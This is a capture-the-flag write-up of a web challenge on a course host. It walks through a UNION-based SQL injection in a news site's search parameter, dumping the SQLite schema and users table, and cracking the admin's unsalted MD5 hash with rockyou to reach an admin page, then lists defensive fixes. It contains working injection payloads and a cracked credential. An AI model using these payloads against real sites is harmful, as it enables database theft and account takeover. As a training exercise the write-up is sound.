---
title: "CTF News — UNION injection, hash dump, admin panel"
category: Web
host: sql-injection-simple.is-course.ru
tags: [sqli, union, sqlite, md5, rockyou, admin-panel]
technique: "UNION-based SQLi in `search` → dump users → crack md5 → `/admin/`"
status: solved
---

# CTF News

## Overview

A small news site with a single search box (`GET /?search=…`). The flag is not in the database — the
database is the *key*: dump the users table, crack the admin hash, log in, and find the admin page that
the hint points at.

## Finding the injection

```
GET /?search='            →  1134 bytes (empty result set)
GET /?search=             →  1890 bytes (three news items)
GET /?search=' OR '1'='1  →  1890 bytes (everything again)
```

The quote turns the query into something that returns nothing, and the boolean payload restores the full
result set: the parameter is concatenated into SQL. A `UNION` gives the backend away — SQLite:

```
' UNION SELECT 1--            → SELECTs to the left and right of UNION do not have the same number of result columns
' UNION SELECT 1,2,3--        → same error
' UNION SELECT 1,2,3,4--      → 2 3 By: 4        (the injected row is rendered)
```

Four columns, and the template prints `title`, `content` and `author` — so columns 2, 3 and 4 are
visible.

## Dumping the schema

```
/?search=' UNION SELECT 1,name,sql,4 FROM sqlite_master--
```

```sql
CREATE TABLE news  (id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT, content TEXT, author TEXT)
CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT)
```

There is no flag table, so the target is the `users` table:

```
/?search=' UNION SELECT 1,id||' / '||username,password,'x' FROM users--
```

```
1 / admin   578f2503faecb8d90809684d1f79c3ef
```

An unsalted MD5 — crackable offline. **rockyou** has it:

```python
hashlib.md5(b"0875659655").hexdigest() == "578f2503faecb8d90809684d1f79c3ef"   # True
```

(The password is a phone number, which is why the usual "admin / password / 123456" guesses miss it and
a real wordlist does not.)

## Getting the flag

The login form itself is *not* injectable — the credentials are bound as parameters — so the hash is the
only way in:

```python
s.post(B + "/login", data={"username": "admin", "password": "0875659655"})
# → logged in as admin.  Hint: find admin page
s.get(B + "/admin/")
# → YDS{…redacted…}
```

`/admin` (no slash) answers `308 → /admin/`, which is a reminder that a directory-style route may hide
behind a redirect that a naive scanner reports as "not found".

## Lessons

1. **The database is not the goal; it is the map.** Nothing in `news` or `users` was the flag, but the
   credentials were.
2. **Crack with a real wordlist.** 14.3 M rockyou entries take ~40 s in Python; a "top 10" list misses a
   phone number.
3. **Trust the error messages.** The SQLite `UNION` column-count error hands you the column count in one
   request; no guessing needed.
4. The flag contains two `U+FEFF` zero-width characters — copy it byte-exact.

## Fix

Parameterised queries (`cursor.execute("… WHERE title LIKE ?", (f"%{q}%",))`), password hashing with
Argon2/bcrypt instead of unsalted MD5, and an admin panel that is authorised server-side rather than
hidden behind an unlinked URL.
